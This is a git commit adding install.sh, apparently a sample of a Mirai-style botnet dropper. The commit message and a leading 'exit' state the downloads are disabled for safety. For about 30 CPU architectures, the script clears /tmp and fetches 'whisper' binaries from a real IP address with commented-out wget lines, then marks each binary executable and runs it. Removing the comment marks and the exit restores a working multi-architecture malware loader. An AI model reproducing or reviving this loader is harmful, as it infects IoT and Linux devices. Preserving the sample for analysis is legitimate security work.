0e9e85e8953c71d962cdaf76ec162d22ffe7592a
Mr128Bit <16866788+Mr128Bit@users.noreply.github.com>
2025-10-16 23:59:56 +0200

    Create install.sh
    Malicious downloads disabled

---
+++ install.sh
@@ -0,0 +1,148 @@
+# DO NOT EXECUTE THIS SCRIPT, DOWNLOADS DISABLED FOR SAFETY
+exit
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.armv5
+ chmod +x whisper.armv5
+ ./whisper.armv5 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.armv6
+ chmod +x whisper.armv6
+ ./whisper.armv6 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.armv7
+ chmod +x whisper.armv7
+ ./whisper.armv7 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.aarch64
+ chmod +x whisper.aarch64
+ ./whisper.aarch64 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.aarch64be
+ chmod +x whisper.aarch64be
+ ./whisper.aarch64be 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.arcle750d
+ chmod +x whisper.arcle750d
+ ./whisper.arcle750d 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.arclehs38
+ chmod +x whisper.arclehs38
+ ./whisper.arclehs38 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.mips
+ chmod +x whisper.mips
+ ./whisper.mips 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.mips64
+ chmod +x whisper.mips64
+ ./whisper.mips64 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.mips64le
+ chmod +x whisper.mips64le
+ ./whisper.mips64le 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.mips64len32
+ chmod +x whisper.mips64len32
+ ./whisper.mips64len32 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.mips64n32
+ chmod +x whisper.mips64n32
+ ./whisper.mips64n32 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.mipsle
+ chmod +x whisper.mipsle
+ ./whisper.mipsle 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.riscv32
+ chmod +x whisper.riscv32
+ ./whisper.riscv32 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.riscv64
+ chmod +x whisper.riscv64
+ ./whisper.riscv64 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.m68k
+ chmod +x whisper.m68k
+ ./whisper.m68k 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.sh4
+ chmod +x whisper.sh4
+ ./whisper.sh4 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.i686
+ chmod +x whisper.i686
+ ./whisper.i686 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.x64
+ chmod +x whisper.x64
+ ./whisper.x64 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.powerpc440fp
+ chmod +x whisper.powerpc440fp
+ ./whisper.powerpc440fp 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.powerpc64e5500
+ chmod +x whisper.powerpc64e5500
+ ./whisper.powerpc64e5500 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.powerpc64e6500
+ chmod +x whisper.powerpc64e6500
+ ./whisper.powerpc64e6500 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.powerpc64lepower8
+ chmod +x whisper.powerpc64lepower8
+ ./whisper.powerpc64lepower8 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.powerpc64power8
+ chmod +x whisper.powerpc64power8
+ ./whisper.powerpc64power8 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.powerpce300c3
+ chmod +x whisper.powerpce300c3
+ ./whisper.powerpce300c3 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.powerpce500mc
+ chmod +x whisper.powerpce500mc
+ ./whisper.powerpce500mc 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.sparc
+ chmod +x whisper.sparc
+ ./whisper.sparc 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.sparc64
+ chmod +x whisper.sparc64
+ ./whisper.sparc64 410
+cd /tmp
+ rm -rf whisper.*
+ #wget http://31.170.22.205/bins/whisper.armv4
+ chmod +x whisper.armv4
+ ./whisper.armv4 410
+rm -rf whisper.*
